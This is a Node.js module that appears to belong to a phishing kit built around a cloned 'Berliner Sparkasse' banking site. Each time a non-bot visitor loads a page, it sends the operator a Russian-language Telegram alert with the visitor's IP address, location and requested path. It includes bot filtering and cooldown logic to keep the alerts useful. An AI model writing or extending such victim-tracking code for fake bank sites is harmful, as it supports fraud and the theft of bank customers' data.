/**
 * Telegram alert when a new visitor opens the site.
 */
import { createHash } from 'node:crypto';
import { isBotRequest } from './bot-filter.mjs';
import {
  escHtml,
  formatUserBlock,
  getClientIp,
  getUserContext,
  sendTelegram,
} from './telegram.mjs';

const COOLDOWN_MS = Number(process.env.VISITOR_NOTIFY_COOLDOWN_MS) || 60 * 60 * 1000;

/** @type {Map<string, number>} */
const seen = new Map();
/** @type {Set<string>} */
const inFlight = new Set();

function visitorKey(ip, ua) {
  const h = createHash('sha256').update(`${ip}|${ua}`).digest('hex').slice(0, 16);
  return `${ip}:${h}`;
}

function shouldNotify(key) {
  const now = Date.now();
  const last = seen.get(key);
  if (last && now - last < COOLDOWN_MS) return false;
  if (inFlight.has(key)) return false;
  inFlight.add(key);
  seen.set(key, now);
  if (seen.size > 5000) {
    const cutoff = now - COOLDOWN_MS * 2;
    for (const [k, t] of seen) {
      if (t < cutoff) seen.delete(k);
    }
  }
  return true;
}

/**
 * @param {import('node:http').IncomingMessage} req
 * @param {{ path?: string }} meta
 */
export async function notifyNewVisitor(req, meta = {}) {
  if (isBotRequest(req)) return;

  const ip = getClientIp(req);
  const ua = req.headers['user-agent'] || '';
  const key = visitorKey(ip, ua);

  if (!shouldNotify(key)) return;

  try {
    const ctx = await getUserContext(req);
    const when = new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });
    const path = meta.path || req.url || '/';

    const text = [
      '🟢 <b>Новый посетитель на сайте</b>',
      '━━━━━━━━━━━━━━━━',
      '',
      `🏦 <b>Berliner Sparkasse Mirror</b>`,
      `🕐 <b>Время:</b> ${escHtml(when)} (Berlin)`,
      '',
      formatUserBlock(ctx, { page: path }),
    ].join('\n');

    await sendTelegram(text);
    console.log('[visitor] Telegram →', ctx.ip, ctx.location);
  } finally {
    inFlight.delete(key);
  }
}

export function isVisitorPageRequest(pathname, method) {
  if (method !== 'GET') return false;
  if (pathname.startsWith('/api')) return false;
  if (pathname.startsWith('/__module')) return false;
  if (pathname.startsWith('/__sparkasse')) return false;
  if (/\.(js|css|png|jpe?g|gif|svg|ico|woff2?|map|json|webp|avif|mp4)(\?|$)/i.test(pathname)) {
    return false;
  }
  if (pathname.startsWith('/etc/')) return false;
  if (pathname.startsWith('/content/dam/')) return false;
  return true;
}
